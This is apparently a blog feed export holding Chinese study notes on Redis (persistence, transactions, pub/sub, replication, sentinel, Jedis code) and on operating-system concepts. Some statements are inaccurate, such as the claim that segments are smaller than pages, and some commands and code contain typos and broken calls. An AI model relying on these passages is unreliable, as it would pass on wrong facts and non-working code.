RDB的缺点是最后一次持久化后的数据可能丢失。 Fork Fork的作用是复制一个与当前进程一样的进程。新进程的所有数据（变量、环境变量、程序计数器等） 数值都和原进程一致，但是是一个全新的进程，并作为原进程的子进程 RDB保存的是dump.rdb文件, 先拷贝一份rdb，删除原rdb，再重命名为dump.rdb，即可恢复 配置文件的位置####SNAPSHOTsave 秒钟 写操作次数 禁用 save “” 指定存储至本地数据库时是否压缩数据，默认为yes，Redis采用LZF压缩，如果为了节省CPU时间，可以关闭该选项，但会导致数据库文件变的巨大 rdbcompression yes stop-writes-on-bgsave-error yes 如果后台在save操作出现错误的时候，停止写入 如果配置为no，表示你不在乎数据不一致或者有其他的手段发现和控制 rgbchecksum yes ##是否校验rdb文件 在存储快照后，还可以让Redis使用CRC算法来进行数据校验，但是这样做会增加大约10%的性能消耗， 如果希望获取到最大的性能提升，可以关闭此功能。 触发RDB快照 命令 save 手动保存 save只管保存，其他不管，全部阻塞 bgsave Redis会在后台异步进行快照操作，快照同时还可以响应客户端请求，可以通过lastsave命令获得最后一次成功执行快照的时间 执行flushall命令，也会产生dump.rdb文件，但里面是空的，无意义。 config get dir获取目录 停止 动态所有停止RDB保存规则的方法：redis-cli config set save “” 优势1.适合大规模的数据恢复 2.对数据完整性和一致性要求不高 劣势1.在一定间隔时间做一次备份，所有如果redis意外down掉的话，就会丢失最后一次快照后的所有修改 2.fork的时候，内存中的数据被克隆了一份，大致2倍的膨胀性需要考虑 总结12345内存中的 rdbSave 磁盘中的数据对象 ----------》 RDB文件 rdbload RDB是一个非常紧凑的文件 RDB在保存文件时父进程唯一要做的就是fork出一个子进程来做，接下来的工作全部由子进程来做， 父进程不需要再做其他IO操作，所以RDB持久化方式可以最大化redis的性能 与AOF相比，在恢复大的数据集的时候，RDB方式会更快一些。 数据丢失风险大 RDB需要经常fork子进程来保存数据集到硬盘上，当数据集比较大的时候，fork的过程是非常耗时的，可能会导致Redis在一些毫秒级不能响应客户端的请求。 Redis持久化之AOF 以日志的形式来记录每个写操作，将Redis执行过的所有写指令记录下来（读操作不记录），只许追加文件但不可以改写文件，redis启动之初会读取该文件重新构建数据，换言之，redis重启的话就根据日志文件的内容将写指令从前到后执行一次以完成数据的恢复工作 AOF保存的是appendonly.aof文件 #####appendonly恢复：删除dump.rdb，vim appendonly.aof，删除末尾行的FLUSHALL，再次连接数据库即可访问。 两者可以共存，优先找aof，如果aof有修改为不能识别的字符，开启redis时会被拒绝。 这时，当前文件夹下有一个redis-check-aof，使用命令： 12redis-check-aof --fix appendonly.aofcontinue?[y&#x2F;N]:y 命令会删除不符合语法规范的字段。 rewriteAOF采用文件追加方式，文件会越来越大为避免出现此种情况，新增了重写机制，当AOF文件的大小超过所设定的阈值时，Redis就会启动AOF文件的内容压缩，只保留可以恢复数据的最小指令集.可以使用bgrewriteaof 重写原理： AOF文件持续增长而过大时，会fork出一条新进程来将文件重写（也是先写临时文件最后再rename），遍历新进程的内存中数据，每条记录有一条的set 语句。重写aof文件的操作，并没有读取旧的aof文件，而是将整个内存中的数据库内容用命令的方式重写了一个新的aof文件，这点和快照有点类似。 触发机制： Redis会记录上次重写时的AOF大小，默认配置是当AOF文件大小是上次rewrite后大小的一倍且文件大于64M时触发。 auto-aof-rewrite-percentage 100 一倍 auto-aof-rewrite-min-size 64mb 优势每秒同步：appendfsync always 同步持久化 每次发生数据变更会被立即记录到磁盘 性能较差但数据完整比较好 每修改同步：appendfsync everysec 异步操作，每秒记录 如果一秒内宕机，有数据丢失。 不同步：appendfsync no 从不同步 劣势相同数据集的数据而言aof文件要远大于rdb文件，恢复速度慢与rdb aof运行效率要慢与rdb，每秒同步策略较好，不同步效率和rdb相同 1234 AOF 网络协议格式 _________________ 命令请求 ________________ 的命令内容 ____________________| 客户端 | __________&gt; | 服务器 | __________&gt;| AOF文件 ||_________________| |________________| |___________________| aof文件时一个只进行追加的日志文件 Redis可以在AoF文件体积变得过大时，自动地在后台对AOF进行重写 对于相同的数据集来说，AOF文件的体积通常要大于RDB文件的体积 根据所使用的fsync策略，AOF的速度可能会慢于RDB 总结 RDB持久化方式能够在指定的时间间隔能对你的数据进行快照存储 AOP持久化方式记录每次对服务器写的操作，当服务器重启的时候回重新执行这些命令来回复原始的数据，AOP命令以redis协议追加保存每次写的操作到文件末尾. Redis还能对AOF文件进行后台重写，使得AOF文件的体积不至于过大 只做缓存：如果你只希望你的数据在服务器运行的时候存在，你也可以不使用任何持久化方式. 同时开启两种持久化方式.在这种情况下,当redis重启的时候会优先载入AOF文件来恢复原始的数据,因为在通常情况下AOF文件保存的数据集要比RDB文件保存的数据集要完整. RDB的数据不实时,同时使用两者时服务器重启也只会找AOF文件, 建议不要只使用AOF,因为RDB更适合于备份数据库(AOF在不断变化不好备份), 快速重启,而且不会有AOF可能存在的bug,留着作为一个万一的手段. 事务 可以一次执行多个命令，本质是一组命令的集合。一个事务中的所有命令都会序列化，按顺序地串行化执行而不会被其他命令插入，不许加塞 能做什么？一个队列中，一次性的、顺序性、排他性的执行一系列命令 常用命令 DISCARD 取消事务，放弃执行事务块内的所有命令。 EXEC 执行所有事务块内的命令。 MULTI 标记一个事务块的开始。 UNWATCH 取消 WATCH 命令对所有 key 的监视。 WATCH key [key …] 监视一个(或多个) key ，如果在事务执行之前这个(或这些) key 被其他命令所改动，那么事务将被打断。 正常执行MULTI 相当与 一个新的购物车，每输入一条命令返回QUEUED相当于加入购物车，EXEC执行命令相当于结账。 放弃事务在事务没有EXEC之前调用DISCARD 全体连坐如果有一个指令不能正常运行（编译出错），事务EXEC会报错 冤头债主运行时出错的命令不会执行，而其他命令仍然会放行。 Redis是否支持事务？ 是部分支持。 watch监控 悲观锁(Pessimistic Lock) 我对这个事情的发展很悲观，每次去拿数据的时候都认为别人会修改，为了避免出事，把整张表锁了， 表锁，并发性最差，一致性最好。 乐观锁(Optimistic Lock) 我认为这个事没有人会去干，不会上锁，乐观锁在每条记录的后面加一个version版本号字段。 乐观锁策略：提交版本必须大于记录当前版本才能执行。 在调用MULTI之前，先调用 WATCH + KEY UNWATCH取消所有key的监控 有加塞篡改，监控了key，key被修改了，事务将被打断，调用UNWATCH再执行一次 阶段开启：以MULTI开始一个事务 入队：将多个命令入队到事务中，接到这些命令并不会立即执行，而是放到等待执行的事务队列里面。 执行：由EXEC命令触发事务 总结watch指令，类似乐观锁，事务提交时，如果key的值已被别的客户端改变，比如某个list已被别的客户端push/pop过了，整个事务队列都不会执行。 通过watch命令在事务执行之前监控了多个keys，倘若在watch之后有任何key的值发生了变化，EXEC命令执行的事务都将被放弃，同时返回Nullmulti-bulk应答以通知调用者事务执行失败。 特性：单独的隔离操作：事务中的所有命令都会序列化、按顺序的执行。事务在执行的过程中，不会被其他客户端发送来的请求所打断。 没有隔离级别的概念：队列中的命令没有提交之前都不会实际的被执行，因为事务提交前任何指令都不会被实际执行，也就不存在“事务内的查询要看到事务里的更新，在事务外查询不能看到”这个问题。 不保证原子性：redis同一个事务中如果有一条命令执行失败，其后的命令仍然会被执行，没有回滚。 消息订阅发布是什么？ 进程间的一种消息通信模式：发送者(pub)发送消息，订阅者(sub)接收消息 下图展示了频道channel1，以及订阅这个频道的三个客户端—-client2和client5、client1之间的关系 当有新消息通过PUBLISH命令发送给频道channel1时，这个消息就会发送给订阅它的三个客户端 下表列出了 redis 发布订阅常用命令： 命令 描述 PSUBSCRIBE pattern [pattern …] 订阅一个或多个符合给定模式的频道。 PUBSUB subcommand [argument [argument …]] 查看订阅与发布系统状态。 PUBLISH channel message 将信息发送到指定的频道。 PUNSUBSCRIBE [pattern [pattern …]] 退订所有给定模式的频道。 SUBSCRIBE channel[channel …] 订阅给定的一个或多个频道的信息。 UNSUBSCRIBE[channel [channel …]] 指退订给定的频道。 SUBSCRIBE c1 c2 PULISH c1 message PSUBSCRIBE new* PULISH new4 message 主从复制 主机数据更新后根据配置和策略，自动同步到备机的master/slave机制，Master以写为主，Slave以读为主。 在/myredis下：123cp redis.conf redis6379.confcp redis.conf redis6380.confcp redis.conf redis6381.conf 修改配置文件 12345678vim redis6379.confpidfile &#x2F;var&#x2F;run&#x2F;redis.pid -&gt; &#x2F;var&#x2F;run&#x2F;redis6379.pidport 6379logfile &quot;&quot; -&gt; logfile &quot;6379.log&quot;备份dbfilename dump.rdb -&gt; dump6379.rdb6380,6381 以此为例 分别启动 12redis-server &#x2F;myredis&#x2F;redis6379.confredis-cli -p 6379 检查是否启动 1ps -ef|gref redis 使用命令 info replication查看信息,他们的角色都是master 1role:master 在主机（6379）下往数据库设值 123set k1 v1set k2 v2set k3 v3 在从机（6380,6381）分别使用SLAVEOF命令 1SLAVEOF 127.0.0.1 6379 这时再往主机6379设值 1set k4 v4 从机可以获取值 1234get k4&quot;v4&quot;get k1&quot;v1&quot; 再次使用命令 info replication查看信息 6379主机下多了两个奴隶：6380,6381 6780、6781的角色变成了奴隶。 如果从机尝试写入数据。会出错。因为Master以写为主，Slave以读为主 如果主机SHUTDOWN死了，调用从机的 info replication 1master_link_status: 由up变成了down 从机在原地待命 如果主机重新连接回来了，并设值 1set k7 v7 从机依然可以获取k7的值 12get k7&quot;v7&quot; 如果从机退出并重新连接role角色会变成master，并且会丢失退出期间的数据, 调用SLAVEOF 127.0.0.1 6379就可以恢复连接并获取到原来丢失的值 每次与master断开之后，都需要重新连接，除非配置进redis.conf 薪火相传 去中心化 上一个Slave可以是下一个slave的Master，Slave同样可以接收其他slaves的连接和同步请求，那么该slave作为了链条中的下一个的master，可以有效减轻master的写压力。 中途变更转向：会清除之前的数据，重新建立拷贝最新的 Slaveof 新主库IP 新主库端口 例如81是80的从机，80是79的从机，那么80是79的奴隶，80还是奴隶，81是80的奴隶。 反客为主一主二仆里，主机挂了，从机使用命令： 1SLAVEOF no one 当前从机的角色就变成了主机，其他从机需要调用： 12Slaveof 新主库IP 新主库端口&#x2F;&#x2F;使当前数据库停止与其他数据库同步，转成组数据库。 才能跟随新主机。 复制原理 Slave启动成功连接到master后会发送一个sync命令 Master接到命令启动后台的存盘进程，同时收集所有接受到的用于修改数据集命令，在后台进程执行完毕之后，master将传送整个数据文件到slave，以完成一次完全同步 全量复制：而slave服务在接收到数据库文件数据后，将其存盘并加载到内存中。 增量复制：Master继续将新的所有收集到的修改命令依次传给slave，完成同步 但是只要是重新连接master，一次完全同步（全量复制）将会被自动执行。 哨兵模式 反客为主的自动版，能够后台监控主机是否故障，如果故障了根据投票数自动将从库转换为主库 启动在/myredis下面创建一个sentinel.conf文件 12touch sentinel.confvim sentinel.conf 修改为以下内容： 一组 sentinel.conf 可以监控多个Master 123sentinel monitor 被监控数据库名字(自己起名字) 127.0.0.1 6379 1//数字1 表示主机挂掉后salve投票看让谁接替成为主机，得票数多少后成为主机 启动redis： 1redis-sentinel &#x2F;myredis&#x2F;sentinel.conf 主机断开之后，哨兵监控到了，就开始投票，如果两个从机一人一票，就会重新投票， 票数高的从机替换主机，其他从机都跟随这个新主机。 断开的主机回来之后变成了从机，并跟随新主机。 复制的缺点由于所有的写操作都是先在Master上操作，然后同步更新到Slave上，所以从Master同步带Slave机器有一定的延迟，当系统很繁忙的时候，延迟问题会更加严重，Slave机器数量的增加也会使这个问题更加严重。 Jedis测试联通 先启动 在/usr/local/bin下： 1$ redis-server &#x2F;myredis&#x2F;redis.conf 1$ redis-cli -p 6379 Java： 依赖： 1234567891011121314&lt;dependencies&gt; &lt;!-- https://mvnrepository.com/artifact/org.apache.commons/commons-pool2 --&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.commons&lt;/groupId&gt; &lt;artifactId&gt;commons-pool2&lt;/artifactId&gt; &lt;version&gt;2.8.0&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;redis.clients&lt;/groupId&gt; &lt;artifactId&gt;jedis&lt;/artifactId&gt; &lt;version&gt;3.3.0&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt; 123456789101112/** * @Author: Wizard * @Date: 2020/6/29 18:33 */public class TestPing &#123; public static void main(String[] args) &#123; Jedis jedis = new Jedis(\"127.0.0.1\", 6379); System.out.println(jedis.ping()); &#125;&#125;------PONG API 1234567891011121314151617/** * @Author: Wizard * @Date: 2020/6/29 18:33 */public class TestAPI &#123; public static void main(String[] args) &#123; Jedis jedis = new Jedis(\"127.0.0.1\", 6379); jedis.set(\"k1\", \"v2\"); jedis.get(\"k1\"); Set&lt;String&gt; keys = jedis.keys(\"*\"); //事务 Transaction multi = jedis.multi(); multi.set(\"k2\", \"v2\");// multi.exec(); multi.discard(); &#125;&#125; 事务 1234567891011121314151617181920212223242526272829/** * @Author: Wizard * @Date: 2020/6/29 20:04 */public class TestTX &#123; public static void main(String[] args) throws InterruptedException &#123; TestTX test = new TestTX(); boolean b = test.transMethod(); System.out.println(b); &#125; public boolean transMethod() throws InterruptedException &#123; Jedis jedis = new Jedis(\"127.0.0.1\", 6379); int balance;//可用余额 int debt;//欠额 int amtToSubtract = 10;//实刷额度 jedis.watch(\"balance\"); //其他程序执行 // Thread.sleep(3000); //jedis.set(\"balance\", \"5\"); balance = Integer.parseInt(jedis.get(\"balance\")); if (balance &lt; amtToSubtract) &#123; jedis.unwatch(); System.out.println(\"modify\"); return false; &#125; return true; &#125;&#125; 主从 123456789101112131415/** * @Author: Wizard * @Date: 2020/6/29 20:04 */public class TestMS &#123; public static void main(String[] args) &#123; Jedis jedis_M = new Jedis(\"127.0.0.1\", 6379); Jedis jedis_S = new Jedis(\"127.0.0.1\", 6380); jedis_S.slaveof(\"127.0.0.1\", 6379); jedis_M.set(\"class\", \"1\"); System.out.println(jedis_S.get(\"class\")); &#125;&#125; 池 123456789101112131415161718192021222324252627/** * @Author: Wizard * @Date: 2020/6/29 20:29 */public class JedisPoolUtils &#123; private static volatile JedisPool jedisPool = null; private JedisPoolUtils() &#123; &#125; public static JedisPool getJedisPoolInstance() &#123; if (null == jedisPool) &#123; synchronized (JedisPoolUtils.class) &#123; if (null == jedisPool) &#123; JedisPoolConfig jedisPoolConfig = new JedisPoolConfig(); jedisPoolConfig.setMaxActive(); jedisPoolConfig.setMaxIdle(32); jedisPoolConfig.setMaxWaitMillis(100*1000); jedisPoolConfig.setTestOnBorrow(true); jedisPool = new JedisPool(\"127.0.0.1\", 6379); &#125; &#125; &#125; return jedisPool; &#125;&#125; JedisPoolConfig: 缓存雪崩","categories":[],"tags":[{"name":"middleware","slug":"middleware","permalink":"https://kayleh.top/tags/middleware/"}]},{"title":"Operating Systems","slug":"操作系统","date":"2020-06-20T05:14:21.000Z","updated":"2021-04-11T17:11:28.898Z","comments":true,"path":"operating-system/","link":"","permalink":"https://kayleh.top/operating-system/","excerpt":"操作系统OS Kernel的特征","text":"操作系统OS Kernel的特征 并发并发：指两个或多个事件在同一时间间隔内发生。这些事件宏观上是同时发生的，但微观上是交替发生的。 常考易混概念——并行：指两个或多个事件在同一时刻同时发生。 操作系统的并发性指计算机系统中“同时”运行着多个程序，这些程序宏观上看是同时运行着的，而微观 上看是交替运行的。 操作系统就是伴随着“多道程序技术”而出现的。因此，操作系统和程序并发是一起诞生的。 注意： 单核CPU同一时刻只能执行一个程序，各个程序只能并发地执行 多核CPU同一时刻可以同时执行多个程序，多个程序可以并行地执行。 计算机系统中存在多个运行的程序，需要OS管理和调度 共享共享即资源共享，是指系统中的资源可供内存中多个并发执行的进程共同使用。 同时共享 系统中的某些资源，虽然可以提供给 多个进程使用，但一个时间段内只允 许一个进程访问该资源 互斥共享 系统中的某些资源，允许一个时间段 内由多个进程“同时”对它们进行访 问 所谓的“同时”往往是宏观上的，而在微观上，这些进程可能是交替地对该资源进行访问的（即分时共享）生活实例： 互斥共享方式：使用QQ和微信视频。同一时间段内摄像头只能分配给其中一个进程。 同时共享方式：使用QQ发送文件A，同时使用微信发送文件B。宏观上看，两边都在同时读取并发送文件， 说明两个进程都在访问硬盘资源，从中读取数据。微观上看，两个进程是交替着访问硬盘的。 共享和并发的关系：并发性指计算机系统中同时存在着多个运行着的程序。 共享性是指系统中的资源可供内存中多个并发执行的进程共同使用。 通过上述例子来看并发与共享的关系： 并发性与共享性是互为存在条件。 虚拟利用多道程序设计技术，让每个用户都觉得有一个计算机专门为他服务。虚拟是指把一个物理上的实体变为若干个逻辑上的对应物。物理实体是实际存在的，而逻辑上 对应物是用户感受到的。虚拟技术中的“时分复用 技术”。微观上处理机在 各个微小的时间段内交替 着为各个进程服务 虚拟技术分为空分复用技术（如虚拟存储器技术）和时分复用技术（如虚拟处理器）。 没有并发性，就没有虚拟性 异步程序的执行不是一贯到底，而是走走停停，向前推进的速度不可预知。 但只要运行环境相同，OS需要保证程序运行的结果也要相同。 只有拥有并发性才有异步性。 操作系统的功能资源的管理者 处理机管理 处理机分配都是以进程为单位，所以处理机管理也被看做是进程管理。包括进程控制，进程同步，进程通信和进程调度 存储器管理 内存分配，内存保护，地址映射，内存扩充 文件管理 管理用户文件和系统文件，方便使用同时保证安全性。包括：磁盘存储空间管理，目录管理，文件读写管理以及文件共享和保护 设备管理 管理所有外围设备，包括完成用户的IO请求；为用户进程分配IO设备；提高IO设备利用率；提高IO速度；方便IO的使用 提供接口：程序接口（API）和用户接口（GUI） 联机命令接口实例 联机命令接口就是交互式命令接口(CMD) 用户命令一句，系统执行一句。 脱机命令接口实例 脱机命令接口实例，脱机命令接口也就是批处理命令接口 用户命令一堆，系统执行一堆。 程序接口： 可以在程序中进行系统调用(广义指令)来使用程序接口。普通用户不能直接使用程序接口，只能通过程 序代码间接使用。 BIOS关系：DISK：存放OS BIOS：基本I/O处理系统，最基本的功能是电源开启后检测外设，之后加载相应的软件来执行 Bootloader：加载OS，把OS从硬盘放到内存里，让CPU可以操作系统， 从图可以看出，计算机里面有一部分空间（硬盘）已经给BIOS占用了，但是还有很多地方是空的，BIOS需要从一个特定的地址开始执行，以X86为例，固定的地址为0xf000:fff0. CS寄存器和IP寄存器一起可以形成一个内存地址，一开始加电，BIOS就从这个地址开始执行。执行一系列的工作： POST（加电自检） 寻找显卡和执行BIOS，检查设备是否可以正常工作。初始化的检擦。 BIOS是如何把bootloader放进去的： Bootloader一般是放在硬盘的第一个主引导扇区。第一个扇区是512个字节。把bootloader放到内存里，CPU的掌控权就在bootloader； 运行机制两种指令 特权指令，如内存清零指令——不允许用户程序使用 非特权指令，如普通的运算指令。 两种处理器状态 用户态（目态） 核心态（管态） 两种程序 内核程序 应用程序 操作系统内核与硬件关联紧密的模块 时钟管理 中断处理 原语 其他： 对系统资源进行管理的功能 操作系统的体系结构 大内核：将操作系统的主要功能模块都作为系统内核，运行在核心态 优点：高性能 缺点：内核代码庞大。结构混乱，难以维护。 微内核：只把最基本的功能保留在内核、 优点：内核功能少，结构清晰，方便维护 缺点：需要频繁的在核心态和用户态之间切换，性能低 1.特权指令只能在核心态下执行 2.内核程序只能在核心态下执行 3.核心态和用户态的切换 操作系统与设备和程序交互。系统调用、异常、中断 系统调用（来源于应用程序）sys call 应用程序主动向操作系统发出服务请求。 异常（来源于不良的应用程序） exception 非法指令或者其他坏的处理状态（如：内存出错） 中断（来源与外设）interrupt 来自不同硬件设备的计时器和网络中断。 为什么应用程序不直接使用外设而要经过操作系统？ 在计算机运行中，内核是被信任的第三方 只有内核可以执行特权指令 为了方便应用程序 产生的源头： 中断：外设 异常：应用程序意想不到的行为 系统调用：应用程序请求操作提供服务。 处理时间： 中断：异步，异步：当这个事件产生的时候，我们应用程序并不知道什么时候产生。 异常：同步，异常执行到某条特定的指令后一定会产生 系统调用：异步或同步，当系统调用发出请求的时候，返回的时间是异步的 响应： 中断：持续，对用户应用程序是透明的、 异常: 杀死或者重新执行意想不到的应用程序指令 系统调用：等待和持续 进程和线程以及它们的区别进程是对运行时程序的封装，是系统进行资源调度和分配的基本单位，实现了操作系统的并发（如：用户运行自己的程序，系统就创建一个进程，并为它分配资源，包括各种表格、内存空间、磁盘空间、I/O设备等，然后该进程被放入到进程的就绪队列，进程调度程序选中它，为它分配CPU及其他相关资源，该进程就被运行起来）； 线程是进程的子任务，是CPU调度和分派的基本单位，用于保证程序的实时性，实现进程内部的并发； 在没有实现线程的操作系统中，进程既是资源分配的基本单位，又是调度的基本单位，它是系统中并发执行的单元。而在实现了线程的操作系统中，进程是资源分配的基本单位，但是线程是调度的基本单位，是系统中并发执行的单元。 引入线程主要有以下4个方面的优点： 1）易于调度。 2）提高并发性。通过线程可以方便有效地实现并发。 3）开销小。创建线程比创建进程要快，所需要的开销也更小。 4）有利于发挥多处理器的功能。通过创建多线程，每个线程都在一个处理器上运行，从而实现应用程序的并行，使每个处理器都得到充分的运行。 尽管线程和进程很相似，但两者也存在着很大的不同，区别如下： 一个程序至少有一个进程，一个进程至少有一个线程，线程依赖于进程而存在； 进程在执行过程中拥有独立的内存单元，而多个线程共享进程的内存空间。 属于一个进程的所有线程共享该进程的所有资源，包括打开的文件，创建的Socket等。不同的进程互相独立。 线程又被称为轻量级进程。进程有进程控制块，线程有线程控制块。但线程控制块比进程控制块小得多。线程间切换代价小，进程间切换代价大。 进程是程序的一次执行，线程可以理解为程序中一段程序片段的执行。 进程间的通信的几种方式管道（pipe）及命名管道（named pipe）：管道可用于具有亲缘关系的父子进程间的通信，有名管道除了具有管道所具有的功能外，它还允许无亲缘关系进程间的通信； 信号（signal）：信号是一种比较复杂的通信方式，用于通知接收进程某个事件已经发生； 消息队列：消息队列是消息的链接表，它克服了上两种通信方式中信号量有限的缺点，具有写权限得进程可以按照一定得规则向消息队列中添加新信息；对消息队列有读权限得进程则可以从消息队列中读取信息； 共享内存：可以说这是最有用的进程间通信方式。它使得多个进程可以访问同一块内存空间，不同进程可以及时看到对方进程中对共享内存中数据得更新。这种方式需要依靠某种同步操作，如互斥锁和信号量等； 信号量：主要作为进程之间及同一种进程的不同线程之间得同步和互斥手段； 套接字：这是一种更为一般得进程间通信机制，它可用于网络中不同机器之间的进程间通信，应用非常广泛。 线程的实现方式(用户线程与内核线程的区别)根据操作系统内核是否对线程可感知，可以把线程分为内核线程和用户线程。 内核线程建立和销毁都是由操作系统负责、通过系统调用完成的，操作系统在调度时，参考各进程内的线程运行情况做出调度决定，如果一个进程中没有就绪态的线程，那么这个进程也不会被调度占用CPU。 和内核线程相对应的是用户线程，用户线程指不需要内核支持而在用户程序中实现的线程，其不依赖于操作系统核心，用户进程利用线程库提供创建、同步、调度和管理线程的函数来控制用户线程。用户线程多见于一些历史悠久的操作系统，例如Unix操作系统，不需要用户态/核心态切换，速度快，操作系统内核不知道多线程的存在，因此一个线程阻塞将使得整个进程（包括它的所有线程）阻塞。由于这里的处理器时间片分配是以进程为基本单位，所以每个线程执行的时间相对减少为了在操作系统中加入线程支持，采用了在用户空间增加运行库来实现线程，这些运行库被称为“线程包”，用户线程是不能被操作系统所感知的。 引入用户线程，具体而言，有以下四个方面的优势：（1）可以在不支持线程的操作系统中实现。 （2）创建和销毁线程、线程切换代价等线程管理的代价比内核线程少得多。 （3）允许每个进程定制自己的调度算法，线程管理比较灵活。 （4）线程能够利用的表空间和堆栈空间比内核级线程多。 用户线程的缺点主要有以下两点：（1）同一进程中只能同时有一个线程在运行，如果有一个线程使用了系统调用而阻塞，那么整个进程都会被挂起。 （2）页面失效也会产生类似的问题。 内核线程的优缺点刚好跟用户线程相反。实际上，操作系统可以使用混合的方式来实现线程。 进程有哪几种状态？就绪状态：当进程已经分配到除CPU以外的所有必要的资源，只要获得处理机便可立即执行； 运行状态：当进程已获得处理机，其程序正在处理机上执行； 阻塞状态： 正在执行的进程，由于某个事件发生而无法执行时，便放弃处理机而处于阻塞状态；引起进程阻塞状态的事件可以有多种，例如，等待I/O完成、申请缓冲区不能满足、等待信件（信号）。 注意区别就绪状态和等待状态：就绪状态是指进程仅缺少处理机，只要获得处理机资源就立即执行；而等待状态是指进程需要其他资源（除了处理机）或等待某一事件。 就绪状态 -&gt; 运行状态：处于就绪状态的进程被调度后，获得处理机资源（分派处理机时间片），于是进程由就绪状态转换为运行状态。 运行状态 -&gt; 就绪状态：处于运行状态的进程在时间片用完后，不得不让出处理机，从而进程由运行状态转换为就绪状态。此外，在可剥夺的操作系统中，当有更高优先级的进程就 、 绪时，调度程度将正执行的进程转换为就绪状态，让更高优先级的进程执行。 运行状态 -&gt; 阻塞状态：当进程请求某一资源（如外设）的使用和分配或等待某一事件的发生（如I/O操作的完成）时，它就从运行状态转换为阻塞状态。进程以系统调用的形式请求操作系统提供服务，这是一种特殊的、由运行用户态程序调用操作系统内核过程的形式。 阻塞状态 -&gt; 就绪状态：当进程等待的事件到来时，如I/O操作结束或中断结束时，中断处理程序必须把相应进程的状态由阻塞状态转换为就绪状态。 用户态和核心态的区别。当一个任务（进程）执行系统调用而陷入内核代码中执行时，我们就称进程处于内核运行态（或简称为内核态）。此时处理器处于特权级最高的（0级）内核代码中执行。当进程处于内核态时，执行的内核代码会使用当前进程的内核栈。每个进程都有自己的内核栈。当进程在执行用户自己的代码时，则称其处于用户运行态（用户态）。即此时处理器在特权级最低的（3级）用户代码中运行。当正在执行用户程序而突然被中断程序中断时，此时用户程序也可以象征性地称为处于进程的内核态。因为中断处理程序将使用当前进程的内核栈。这与处于内核态的进程的状态有些类似。 用户态切换到内核态的3种方式：系统调用、异常、外围设备中断。 什么是缓冲区溢出？有什么危害？其原因是什么？缓冲区溢出是指当计算机向缓冲区内填充数据时超过了缓冲区本身的容量，溢出的数据覆盖在合法数据上。 危害：在当前网络与分布式系统安全中，被广泛利用的50%以上都是缓冲区溢出，其中最著名的例子是1988年利用fingerd漏洞的蠕虫。而缓冲区溢出中，最为危险的是堆栈溢出，因为入侵者可以利用堆栈溢出，在函数返回时改变返回程序的地址，让其跳转到任意地址，带来的危害一种是程序崩溃导致拒绝服务，另外一种就是跳转并且执行一段恶意代码，比如得到shell，然后为所欲为。通过往程序的缓冲区写超出其长度的内容，造成缓冲区的溢出，从而破坏程序的堆栈，使程序转而执行其它指令，以达到攻击的目的。 造成缓冲区溢出的主原因是程序中没有仔细检查用户输入的参数。 死锁死锁的概念 所谓死锁是指两个或两个以上的进程在执行过程中，因争夺资源而造成的一种互相等待的现象，若无外力作用，它们都将无法推进下去，此时称系统处于死锁状态或系统产生了死锁。通俗的讲，就是两个或多个进程无限期的阻塞、相互等待的一种状态。 死锁产生的四个必要条件 互斥条件：一个资源每次只能被一个进程使用；若其他进程申请使用该资源，必须等到该资源被释放为止； 请求与保持条件：一个进程因请求资源而阻塞时，对已获得的资源保持不放； 不可剥夺条件：进程已获得的资源，在未使用完之前，不能强行剥夺； 循环等待条件：若干进程之间形成一种头尾相接的环形等待资源关系； 死锁的解除与预防1 死锁预防死锁预防的基本思想是 只要确保死锁发生的四个必要条件中至少有一个不成立，就能预防死锁的发生，具体方法包括： 注意：互斥条件无法破坏 打破请求与保持条件：可以实行资源预先分配策略(进程在运行前一次性向系统申请它所需要的全部资源，若所需全部资源得不到满足，则不分配任何资源，此进程暂不运行；只有当系统能满足当前进程所需的全部资源时，才一次性将所申请资源全部分配给该线程)或者只允许进程在没有占用资源时才可以申请资源（一个进程可申请一些资源并使用它们，但是在当前进程申请更多资源之前，它必须全部释放当前所占有的资源）。但是这种策略也存在一些缺点：在很多情况下，无法预知一个进程执行前所需的全部资源，因为进程是动态执行的，不可预知的；同时，会降低资源利用率，导致降低了进程的并发性。 打破不可剥夺条件：允许进程强剥夺使用其他进程占有的资源，从而破坏不可剥夺条件。也就是说，一个进程占有了一部分资源，在其申请新的资源且得不到满足时，它必须释放所有占有的资源以便让其它线程使用。这种预防死锁的方式实现起来困难，会降低系统性能。 打破循环等待条件：实行资源有序分配策略，破坏环路条件。对所有资源排序编号，所有进程对资源的请求必须严格按资源序号递增的顺序提出，即只有占用了小号资源才能申请大号资源，这样就不回产生环路，预防死锁的发生。 2死锁避免的基本思想死锁避免的基本思想是动态地检测资源分配状态，以确保循环等待条件不成立，从而确保系统处于安全状态。所谓安全状态是指：如果系统能按某个顺序为每个进程分配资源（不超过其最大值），那么系统状态是安全的，换句话说就是，如果存在一个安全序列，那么系统处于安全状态。资源分配图算法和银行家算法是两种经典的死锁避免的算法，其可以确保系统始终处于安全状态。其中，资源分配图算法应用场景为每种资源类型只有一个实例(申请边，分配边，需求边，不形成环才允许分配)，而银行家算法应用于每种资源类型可以有多个实例的场景。 银行家算法：该算法需要检查申请者对资源的最大需求量，如果系统现存的各类资源可以满足申请者的请求，就满足申请者的请求。这样申请者就可以很快完成其计算，然后释放它占用的资源，从而保证了系统中所有进程都能完成，所以可避免死锁的发生。 内存管理有哪几种方式(块式、页式、段式、段页式).内存管理有块式管理，页式管理，段式和段页式管理。现在常用段页式管理。 块式管理：把主存分为一大块、一大块的，当所需的程序片断不在主存时就分配一块主存空间，把程序片断load入主存，就算所需的程序片度只有几个字节也只能把这一块分配给它。这样会造成很大的浪费，平均浪费了50％的内存空间，但是易于管理。 页式管理：把主存分为一页一页的，每一页的空间要比一块一块的空间小很多，显然这种方法的空间利用率要比块式管理高很多。 段式管理：把主存分为一段一段的，每一段的空间又要比一页一页的空间小很多，这种方法在空间利用率上又比页式管理高很多，但是也有另外一个缺点。一个程序片断可能会被分为几十段，这样很多时间就会被浪费在计算每一段的物理地址上。 段页式管理：结合了段式管理和页式管理的优点。将程序分成若干段，每个段分成若干页。段页式管理每取一数据，要访问3次内存。 分页和分段有什么区别（内存管理）？​ 段式存储管理是一种符合用户视角的内存分配管理方案。在段式存储管理中，将程序的地址空间划分为若干段（segment），如代码段，数据段，堆栈段；这样每个进程有一个二维地址空间，相互独立，互不干扰。段式管理的优点是：没有内碎片（因为段大小可变，改变段大小来消除内碎片）。但段换入换出时，会产生外碎片（比如4k的段换5k的段，会产生1k的外碎片） 